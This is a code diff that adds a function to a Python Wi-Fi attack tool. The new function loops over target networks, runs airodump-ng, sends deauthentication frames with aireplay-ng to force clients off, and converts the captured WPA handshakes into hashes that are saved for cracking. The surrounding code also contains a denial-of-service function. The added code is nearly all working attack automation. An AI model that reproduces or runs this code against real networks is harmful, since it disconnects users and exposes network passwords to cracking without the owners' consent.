@@ -78,6 +78,48 @@ def get_targets(networks: list, interface: str, scan_time: int = 5) -> List[Dict
             targets.append(network)
     return targets
 
+def handshake_active(networks: list, interface: str, deauth_count: int = 10, waiting_time: int = 90):
+    hashes_file = "hashes"
+    targets = get_targets(networks, interface) 
+    if not confirm(f"Are you shure want to attack {len(targets)} networks?"):
+        print("[!] Attack canceled")
+        return
+    for target in targets:
+        print(f"[+] Attacking {target['ESSID']}...")
+        output_file = "airodump_output"
+        airodump_process = subprocess.Popen(
+                f"airodump-ng -w {output_file} -c {target['channel']} --output-format cap {interface} > /dev/null",
+                shell=True, 
+                stdout=subprocess.PIPE,
+                )
+        aireplay_process = subprocess.Popen(
+                f"aireplay-ng --deauth {deauth_count} -a {target['BSSID']} -c {target['clients'][0]['Station MAC']} -D {interface} > /dev/null",
+                shell=True, 
+                stdin=subprocess.PIPE, 
+                )
+        while waiting_time > 0:
+            time.sleep(1)
+            waiting_time -= 1
+
+            os.system("hcxpcapngtool *.cap -o hash > /dev/null")
+
+            if os.path.exists("hash"):
+                print("[OK] Handshake is captured")
+                os.system("pkill -f 'aireplay-ng --deauth'")
+                
+                with open("hash", "r") as file:
+                    hashes = file.read()
+                os.remove("hash")
+
+                with open(hashes_file, "a") as myfile:
+                    myfile.write(hashes)
+                break
+        else:
+            print("[FILED] Timeout")
+        
+        os.system("pkill -f 'airodump-ng'")
+        os.system("rm -f *.cap")
+
 def dos(networks: list, interface: str, attack_time: int = 0):
     targets = get_targets(networks, interface) 
     
